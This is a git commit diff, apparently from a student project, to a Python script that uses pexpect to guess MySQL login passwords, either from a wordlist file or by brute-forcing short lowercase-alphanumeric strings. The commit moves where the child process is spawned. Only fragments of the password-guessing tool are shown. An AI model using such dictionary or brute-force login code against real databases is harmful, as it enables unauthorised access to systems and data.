100fa3cc49bc4a3511e3ab4cd12bb78b04f151f1
chi-wei-lien <lien2@purdue.edu>
2022-04-09 16:10:24 -0400

    change spawn child

--- kevin.py
+++ kevin.py
@@ -13,13 +13,14 @@ try:
 except:
   print("please enter the right command")
 
+child = pexpect.spawn(login_command + "0000")
 if flags == "-D":
   file = open(filename, 'r')
   passwords = file.readlines()
 
   for password in passwords:
     try:
-      child = pexpect.spawn(login_command + password)
+      child.sendline(login_command + password)
       i = child.expect('mysql> ')
       print("[*] " + password.strip() + " |  success")
       break;
@@ -32,7 +33,6 @@ if flags == "-D":
 elif flags == "-B":
   is_found = False
   chars = string.ascii_lowercase + string.digits
-  child = pexpect.spawn(login_command + '1234')
   for password_length in range(4):
     for guess in itertools.product(chars, repeat=password_length):
       guess = ''.join(guess)
